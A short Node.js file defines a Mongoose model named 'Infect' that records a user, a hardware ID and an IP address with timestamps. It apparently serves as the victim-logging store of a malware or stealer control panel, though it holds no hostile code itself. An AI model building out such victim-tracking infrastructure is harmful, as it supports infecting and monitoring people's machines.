const mongoose = require("mongoose");

const infectSchema = mongoose.Schema({
    user: { type: String, required: true },
    hwid: { type: String, required: true },
    ip: { type: String, required: true }
}, { timestamps: true })


module.exports = mongoose.model("Infect", infectSchema);